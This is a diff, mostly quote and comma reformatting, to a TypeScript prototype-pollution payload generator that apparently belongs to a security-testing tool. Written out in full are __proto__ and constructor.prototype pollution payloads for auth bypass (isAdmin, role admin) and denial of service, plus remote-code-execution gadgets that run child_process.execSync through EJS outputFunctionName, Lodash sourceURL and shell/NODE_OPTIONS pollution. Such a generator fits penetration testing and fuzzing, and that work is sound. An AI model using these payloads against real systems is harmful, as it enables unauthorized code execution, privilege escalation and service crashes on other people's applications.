@@ -24,8 +24,8 @@
 import {
   IPayloadGenerator,
   GeneratorConfig,
-  GeneratedPayload
-} from './generator.interface';
+  GeneratedPayload,
+} from "./generator.interface";
 
 export interface PrototypePollutionConfig extends GeneratorConfig {
   /** Include RCE-oriented payloads */
@@ -41,10 +41,11 @@ export interface PrototypePollutionConfig extends GeneratorConfig {
 }
 
 export class PrototypePollutionGenerator implements IPayloadGenerator {
-  readonly id = 'prototype-pollution';
-  readonly name = 'Prototype Pollution Generator';
-  readonly category = 'injection';
-  readonly description = 'Generates prototype pollution payloads for JavaScript/Node.js applications';
+  readonly id = "prototype-pollution";
+  readonly name = "Prototype Pollution Generator";
+  readonly category = "injection";
+  readonly description =
+    "Generates prototype pollution payloads for JavaScript/Node.js applications";
 
   private config: PrototypePollutionConfig;
 
@@ -54,8 +55,8 @@ export class PrototypePollutionGenerator implements IPayloadGenerator {
       includeDos: config.includeDos ?? true,
       includeAuthBypass: config.includeAuthBypass ?? true,
       includeNested: config.includeNested ?? true,
-      targetProperty: config.targetProperty ?? 'polluted',
-      ...config
+      targetProperty: config.targetProperty ?? "polluted",
+      ...config,
     };
   }
 
@@ -102,39 +103,40 @@ export class PrototypePollutionGenerator implements IPayloadGenerator {
 
   private generateBasicProtoPayloads(): GeneratedPayload[] {
     const payloads: GeneratedPayload[] = [];
-    const marker = this.config.targetProperty || 'polluted';
+    const marker = this.config.targetProperty || "polluted";
 
     // Object with __proto__
     payloads.push({
       value: { __proto__: { [marker]: true } },
-      category: 'prototype-pollution',
-      type: 'proto-basic',
-      severity: 'critical',
-      description: 'Basic __proto__ pollution attempt',
+      category: "prototype-pollution",
+      type: "proto-basic",
+      severity: "critical",
+      description: "Basic __proto__ pollution attempt",
       expectedVulnerableBehavior: `Object.prototype.${marker} becomes true`,
-      tags: ['injection', 'prototype-pollution', 'cwe-1321']
+      tags: ["injection", "prototype-pollution", "cwe-1321"],
     });
 
     // String version (for JSON parsing)
     payloads.push({
       value: `{"__proto__":{"${marker}":true}}`,
-      category: 'prototype-pollution',
-      type: 'proto-json-string',
-      severity: 'critical',
-      description: 'JSON string with __proto__ pollution',
-      expectedVulnerableBehavior: 'JSON.parse vulnerable to prototype pollution',
-      tags: ['injection', 'prototype-pollution', 'json']
+      category: "prototype-pollution",
+      type: "proto-json-string",
+      severity: "critical",
+      description: "JSON string with __proto__ pollution",
+      expectedVulnerableBehavior:
+        "JSON.parse vulnerable to prototype pollution",
+      tags: ["injection", "prototype-pollution", "json"],
     });
 
     // Array with polluted object
     payloads.push({
-      value: { '__proto__': { [marker]: 'yes' } },
-      category: 'prototype-pollution',
-      type: 'proto-array',
-      severity: 'high',
-      description: 'Array containing prototype pollution payload',
-      expectedVulnerableBehavior: 'Pollution via array iteration',
-      tags: ['injection', 'prototype-pollution']
+      value: { __proto__: { [marker]: "yes" } },
+      category: "prototype-pollution",
+      type: "proto-array",
+      severity: "high",
+      description: "Array containing prototype pollution payload",
+      expectedVulnerableBehavior: "Pollution via array iteration",
+      tags: ["injection", "prototype-pollution"],
     });
 
     // Multiple properties
@@ -142,17 +144,17 @@ export class PrototypePollutionGenerator implements IPayloadGenerator {
       value: {
         __proto__: {
           isAdmin: true,
-          role: 'admin',
+          role: "admin",
           authenticated: true,
-          [marker]: 'polluted'
-        }
+          [marker]: "polluted",
+        },
       },
-      category: 'prototype-pollution',
-      type: 'proto-multi-property',
-      severity: 'critical',
-      description: 'Multiple properties injected via __proto__',
-      expectedVulnerableBehavior: 'Multiple prototype properties polluted',
-      tags: ['injection', 'prototype-pollution', 'privilege-escalation']
+      category: "prototype-pollution",
+      type: "proto-multi-property",
+      severity: "critical",
+      description: "Multiple properties injected via __proto__",
+      expectedVulnerableBehavior: "Multiple prototype properties polluted",
+      tags: ["injection", "prototype-pollution", "privilege-escalation"],
     });
 
     return payloads;
@@ -162,28 +164,29 @@ export class PrototypePollutionGenerator implements IPayloadGenerator {
 
   private generateConstructorPayloads(): GeneratedPayload[] {
     const payloads: GeneratedPayload[] = [];
-    const marker = this.config.targetProperty || 'polluted';
+    const marker = this.config.targetProperty || "polluted";
 
     // constructor.prototype
     payloads.push({
       value: { constructor: { prototype: { [marker]: true } } },
-      category: 'prototype-pollution',
-      type: 'constructor-prototype',
-      severity: 'critical',
-      description: 'Pollution via constructor.prototype',
-      expectedVulnerableBehavior: 'Object.prototype polluted via constructor chain',
-      tags: ['injection', 'prototype-pollution']
+      category: "prototype-pollution",
+      type: "constructor-prototype",
+      severity: "critical",
+      description: "Pollution via constructor.prototype",
+      expectedVulnerableBehavior:
+        "Object.prototype polluted via constructor chain",
+      tags: ["injection", "prototype-pollution"],
     });
 
     // JSON string version
     payloads.push({
       value: `{"constructor":{"prototype":{"${marker}":true}}}`,
-      category: 'prototype-pollution',
-      type: 'constructor-json',
-      severity: 'critical',
-      description: 'JSON string with constructor.prototype pollution',
-      expectedVulnerableBehavior: 'Pollution via parsed JSON',
-      tags: ['injection', 'prototype-pollution', 'json']
+      category: "prototype-pollution",
+      type: "constructor-json",
+      severity: "critical",
+      description: "JSON string with constructor.prototype pollution",
+      expectedVulnerableBehavior: "Pollution via parsed JSON",
+      tags: ["injection", "prototype-pollution", "json"],
     });
 
     return payloads;
@@ -193,23 +196,23 @@ export class PrototypePollutionGenerator implements IPayloadGenerator {
 
   private generateNestedPayloads(): GeneratedPayload[] {
     const payloads: GeneratedPayload[] = [];
-    const marker = this.config.targetProperty || 'polluted';
+    const marker = this.config.targetProperty || "polluted";
 
     // Deep nested __proto__
     payloads.push({
       value: {
         a: {
           b: {
-            __proto__: { [marker]: 'deep' }
-          }
-        }
+            __proto__: { [marker]: "deep" },
+          },
+        },
       },
-      category: 'prototype-pollution',
-      type: 'nested-deep',
-      severity: 'high',
-      description: 'Deeply nested __proto__ pollution',
-      expectedVulnerableBehavior: 'Pollution via deep object merge',
-      tags: ['injection', 'prototype-pollution', 'deep-merge']
+      category: "prototype-pollution",
+      type: "nested-deep",
+      severity: "high",
+      description: "Deeply nested __proto__ pollution",
+      expectedVulnerableBehavior: "Pollution via deep object merge",
+      tags: ["injection", "prototype-pollution", "deep-merge"],
     });
 
     // Multiple levels with __proto__
@@ -217,16 +220,16 @@ export class PrototypePollutionGenerator implements IPayloadGenerator {
       value: {
         __proto__: {
           __proto__: {
-            [marker]: 'double'
-          }
-        }
+            [marker]: "double",
+          },
+        },
       },
-      category: 'prototype-pollution',
-      type: 'nested-double-proto',
-      severity: 'high',
-      description: 'Double __proto__ nesting',
-      expectedVulnerableBehavior: 'Pollution through multiple prototype levels',
-      tags: ['injection', 'prototype-pollution']
+      category: "prototype-pollution",
+      type: "nested-double-proto",
+      severity: "high",
+      description: "Double __proto__ nesting",
+      expectedVulnerableBehavior: "Pollution through multiple prototype levels",
+      tags: ["injection", "prototype-pollution"],
     });
 
     // Mixed nesting
@@ -237,19 +240,19 @@ export class PrototypePollutionGenerator implements IPayloadGenerator {
             settings: {
               constructor: {
                 prototype: {
-                  [marker]: 'mixed'
-                }
-              }
-            }
-          }
-        }
+                  [marker]: "mixed",
+                },
+              },
+            },
+          },
+        },
       },
-      category: 'prototype-pollution',
-      type: 'nested-mixed',
-      severity: 'high',
-      description: 'Mixed __proto__ and constructor nesting',
-      expectedVulnerableBehavior: 'Pollution through mixed traversal',
-      tags: ['injection', 'prototype-pollution']
+      category: "prototype-pollution",
+      type: "nested-mixed",
+      severity: "high",
+      description: "Mixed __proto__ and constructor nesting",
+      expectedVulnerableBehavior: "Pollution through mixed traversal",
+      tags: ["injection", "prototype-pollution"],
     });
 
     return payloads;
@@ -264,15 +267,15 @@ export class PrototypePollutionGenerator implements IPayloadGenerator {
     const authProperties = [
       { isAdmin: true },
       { admin: true },
-      { role: 'admin' },
-      { roles: ['admin'] },
+      { role: "admin" },
+      { roles: ["admin"] },
       { authenticated: true },
       { isAuthenticated: true },
       { verified: true },
       { approved: true },
       { canAccess: true },
-      { permissions: ['*'] },
-      { scope: 'admin' },
+      { permissions: ["*"] },
+      { scope: "admin" },
       { level: 9999 },
       { bypass: true },
     ];
@@ -282,24 +285,24 @@ export class PrototypePollutionGenerator implements IPayloadGenerator {
 
       payloads.push({
         value: { __proto__: props },
-        category: 'prototype-pollution',
-        type: 'auth-bypass',
-        severity: 'critical',
+        category: "prototype-pollution",
+        type: "auth-bypass",
+        severity: "critical",
         description: `Auth bypass via __proto__.${propName}`,
         expectedVulnerableBehavior: `Object inherits ${propName} from polluted prototype`,
-        tags: ['injection', 'prototype-pollution', 'authentication', 'bypass'],
-        metadata: { targetProperty: propName }
+        tags: ["injection", "prototype-pollution", "authentication", "bypass"],
+        metadata: { targetProperty: propName },
       });
 
       // Constructor version
       payloads.push({
         value: { constructor: { prototype: props } },
-        category: 'prototype-pollution',
-        type: 'auth-bypass-constructor',
-        severity: 'critical',
+        category: "prototype-pollution",
+        type: "auth-bypass-constructor",
+        severity: "critical",
         description: `Auth bypass via constructor.prototype.${propName}`,
         expectedVulnerableBehavior: `Object inherits ${propName} from constructor prototype`,
-        tags: ['injection', 'prototype-pollution', 'authentication', 'bypass']
+        tags: ["injection", "prototype-pollution", "authentication", "bypass"],
       });
     }
 
@@ -315,33 +318,34 @@ export class PrototypePollutionGenerator implements IPayloadGenerator {
     payloads.push({
       value: {
         __proto__: {
-          shell: '/proc/self/exe',
+          shell: "/proc/self/exe",
           env: {
-            NODE_OPTIONS: '--require /proc/self/environ'
-          }
-        }
+            NODE_OPTIONS: "--require /proc/self/environ",
+          },
+        },
       },
-      category: 'prototype-pollution',
-      type: 'rce-shell',
-      severity: 'critical',
-      description: 'RCE via shell/env prototype pollution',
-      expectedVulnerableBehavior: 'child_process uses polluted shell/env',
-      tags: ['injection', 'prototype-pollution', 'rce', 'command-injection']
+      category: "prototype-pollution",
+      type: "rce-shell",
+      severity: "critical",
+      description: "RCE via shell/env prototype pollution",
+      expectedVulnerableBehavior: "child_process uses polluted shell/env",
+      tags: ["injection", "prototype-pollution", "rce", "command-injection"],
     });
 
     // EJS/Pug template RCE
     payloads.push({
       value: {
         __proto__: {
-          outputFunctionName: 'x;process.mainModule.require("child_process").execSync("id");x'
-        }
+          outputFunctionName:
+            'x;process.mainModule.require("child_process").execSync("id");x',
+        },
       },
-      category: 'prototype-pollution',
-      type: 'rce-ejs',
-      severity: 'critical',
-      description: 'RCE via EJS outputFunctionName pollution',
-      expectedVulnerableBehavior: 'EJS template engine executes arbitrary code',
-      tags: ['injection', 'prototype-pollution', 'rce', 'template-injection']
+      category: "prototype-pollution",
+      type: "rce-ejs",
+      severity: "critical",
+      description: "RCE via EJS outputFunctionName pollution",
+      expectedVulnerableBehavior: "EJS template engine executes arbitrary code",
+      tags: ["injection", "prototype-pollution", "rce", "template-injection"],
     });
 
     // Handlebars RCE
@@ -349,30 +353,33 @@ export class PrototypePollutionGenerator implements IPayloadGenerator {
       value: {
         __proto__: {
           allowProtoPropertiesByDefault: true,
-          allowProtoMethodsByDefault: true
-        }
+          allowProtoMethodsByDefault: true,
+        },
       },
-      category: 'prototype-pollution',
-      type: 'rce-handlebars',
-      severity: 'critical',
-      description: 'Handlebars prototype access enablement',
-      expectedVulnerableBehavior: 'Handlebars allows prototype access leading to RCE',
-      tags: ['injection', 'prototype-pollution', 'rce', 'template-injection']
+      category: "prototype-pollution",
+      type: "rce-handlebars",
+      severity: "critical",
+      description: "Handlebars prototype access enablement",
+      expectedVulnerableBehavior:
+        "Handlebars allows prototype access leading to RCE",
+      tags: ["injection", "prototype-pollution", "rce", "template-injection"],
     });
 
     // Lodash merge RCE chain
     payloads.push({
       value: {
         __proto__: {
-          sourceURL: '\nreturn process.mainModule.require("child_process").execSync("id")//'
-        }
+          sourceURL:
+            '\nreturn process.mainModule.require("child_process").execSync("id")//',
+        },
       },
-      category: 'prototype-pollution',
-      type: 'rce-lodash',
-      severity: 'critical',
-      description: 'RCE via Lodash template sourceURL pollution',
-      expectedVulnerableBehavior: 'Lodash _.template() executes code via sourceURL',
-      tags: ['injection', 'prototype-pollution', 'rce']
+      category: "prototype-pollution",
+      type: "rce-lodash",
+      severity: "critical",
+      description: "RCE via Lodash template sourceURL pollution",
+      expectedVulnerableBehavior:
+        "Lodash _.template() executes code via sourceURL",
+      tags: ["injection", "prototype-pollution", "rce"],
     });
 
     return payloads;
@@ -387,60 +394,61 @@ export class PrototypePollutionGenerator implements IPayloadGenerator {
     payloads.push({
       value: {
         __proto__: {
-          toString: 'not a function'
-        }
+          toString: "not a function",
+        },
       },
-      category: 'prototype-pollution',
-      type: 'dos-tostring',
-      severity: 'high',
-      description: 'DoS via toString pollution',
-      expectedVulnerableBehavior: 'Application crashes when calling toString()',
-      tags: ['injection', 'prototype-pollution', 'dos']
+      category: "prototype-pollution",
+      type: "dos-tostring",
+      severity: "high",
+      description: "DoS via toString pollution",
+      expectedVulnerableBehavior: "Application crashes when calling toString()",
+      tags: ["injection", "prototype-pollution", "dos"],
     });
 
     // valueOf pollution
     payloads.push({
       value: {
         __proto__: {
-          valueOf: 'not a function'
-        }
+          valueOf: "not a function",
+        },
       },
-      category: 'prototype-pollution',
-      type: 'dos-valueof',
-      severity: 'high',
-      description: 'DoS via valueOf pollution',
-      expectedVulnerableBehavior: 'Application crashes on type coercion',
-      tags: ['injection', 'prototype-pollution', 'dos']
+      category: "prototype-pollution",
+      type: "dos-valueof",
+      severity: "high",
+      description: "DoS via valueOf pollution",
+      expectedVulnerableBehavior: "Application crashes on type coercion",
+      tags: ["injection", "prototype-pollution", "dos"],
     });
 
     // Length pollution (affects arrays)
     payloads.push({
       value: {
         __proto__: {
-          length: 9999999999
-        }
+          length: 9999999999,
+        },
       },
-      category: 'prototype-pollution',
-      type: 'dos-length',
-      severity: 'high',
-      description: 'DoS via length property pollution',
-      expectedVulnerableBehavior: 'Array operations hang or consume excessive memory',
-      tags: ['injection', 'prototype-pollution', 'dos']
+      category: "prototype-pollution",
+      type: "dos-length",
+      severity: "high",
+      description: "DoS via length property pollution",
+      expectedVulnerableBehavior:
+        "Array operations hang or consume excessive memory",
+      tags: ["injection", "prototype-pollution", "dos"],
     });
 
     // Circular reference attempt
     payloads.push({
       value: {
         __proto__: {
-          toJSON: { __proto__: { toJSON: {} } }
-        }
+          toJSON: { __proto__: { toJSON: {} } },
+        },
       },
-      category: 'prototype-pollution',
-      type: 'dos-circular',
-      severity: 'medium',
-      description: 'DoS via potential circular reference in JSON serialization',
-      expectedVulnerableBehavior: 'JSON.stringify enters infinite loop',
-      tags: ['injection', 'prototype-pollution', 'dos']
+      category: "prototype-pollution",
+      type: "dos-circular",
+      severity: "medium",
+      description: "DoS via potential circular reference in JSON serialization",
+      expectedVulnerableBehavior: "JSON.stringify enters infinite loop",
+      tags: ["injection", "prototype-pollution", "dos"],
     });
 
     return payloads;
@@ -450,7 +458,7 @@ export class PrototypePollutionGenerator implements IPayloadGenerator {
 
   private generateJsonPayloads(): GeneratedPayload[] {
     const payloads: GeneratedPayload[] = [];
-    const marker = this.config.targetProperty || 'polluted';
+    const marker = this.config.targetProperty || "polluted";
 
     // Various JSON string formats
     const jsonPayloads = [
@@ -472,12 +480,12 @@ export class PrototypePollutionGenerator implements IPayloadGenerator {
     for (let i = 0; i < jsonPayloads.length; i++) {
       payloads.push({
         value: jsonPayloads[i],
-        category: 'prototype-pollution',
-        type: 'json-variant',
-        severity: 'high',
+        category: "prototype-pollution",
+        type: "json-variant",
+        severity: "high",
         description: `JSON prototype pollution variant ${i + 1}`,
-        expectedVulnerableBehavior: 'JSON.parse creates polluted object',
-        tags: ['injection', 'prototype-pollution', 'json']
+        expectedVulnerableBehavior: "JSON.parse creates polluted object",
+        tags: ["injection", "prototype-pollution", "json"],
       });
     }
 
@@ -488,7 +496,7 @@ export class PrototypePollutionGenerator implements IPayloadGenerator {
 
   private generateQueryStringPayloads(): GeneratedPayload[] {
     const payloads: GeneratedPayload[] = [];
-    const marker = this.config.targetProperty || 'polluted';
+    const marker = this.config.targetProperty || "polluted";
 
     // Query string style (for qs, querystring parsers)
     const queryPayloads = [
@@ -503,12 +511,12 @@ export class PrototypePollutionGenerator implements IPayloadGenerator {
     for (const query of queryPayloads) {
       payloads.push({
         value: query,
-        category: 'prototype-pollution',
-        type: 'query-string',
-        severity: 'high',
+        category: "prototype-pollution",
+        type: "query-string",
+        severity: "high",
         description: `Query string prototype pollution: ${query.substring(0, 30)}...`,
-        expectedVulnerableBehavior: 'Query parser creates polluted object',
-        tags: ['injection', 'prototype-pollution', 'query-string']
+        expectedVulnerableBehavior: "Query parser creates polluted object",
+        tags: ["injection", "prototype-pollution", "query-string"],
       });
     }
 
